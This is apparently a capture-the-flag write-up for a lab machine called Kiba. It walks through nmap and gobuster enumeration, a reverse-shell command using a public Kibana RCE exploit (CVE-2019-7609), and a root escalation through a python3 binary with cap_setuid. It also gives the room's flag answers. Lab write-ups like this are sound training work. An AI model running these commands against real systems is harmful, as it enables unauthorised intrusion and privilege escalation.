# Kiba


1. Enumerate with nmap, scan ports 1-10000. Port 22 running ssh, 80 running apache, and 5601 running Kibana.
```
root@ip-10-10-245-121:~# sudo nmap -sS -A -p 1-10000 10.10.51.212

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-21 19:55 BST
Nmap scan report for ip-10-10-51-212.eu-west-1.compute.internal (10.10.51.212)
Host is up (0.0054s latency).
Not shown: 9997 closed ports
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (EdDSA)
80/tcp   open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequest, DNSVersionBindReq, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 503 Service Unavailable
|     retry-after: 30
|     content-type: text/html; charset=utf-8
|     cache-control: no-cache
|     content-length: 30
|     Date: Thu, 21 Apr 2022 18:55:47 GMT
|     Connection: close
|_    Kibana server is not ready yet
```

2. Visit the webpage, not much there except a hint about linux capabilities. Use gobuster to brute force directories
```
root@ip-10-10-245-121:~# gobuster dir -u http://10.10.51.212/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.51.212/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/04/21 20:10:09 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2022/04/21 20:10:10 Finished
===============================================================
```

3. Do some research on Kibana, it has a RCE vulnerability `CVE-2019-7609`, and we find an exploit on [github](https://github.com/LandGrey/CVE-2019-7609).
4. Start a netcat listener and run the exploit `python2 CVE-2019-7609-kibana-rce.py -u http://10.10.51.212:5601 -host 10.10.245.121 -port 4444 --shell` to get a shell. Print the contents of `/home/kiba` to get `THM{1s_easy_pwn3d_k1bana_w1th_rce}`.
5. List capabilities with getcap
```
kiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2> /dev/null
getcap -r / 2> /dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```
6. Get a root shell with `/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`, and print out root.txt to get `THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}`.
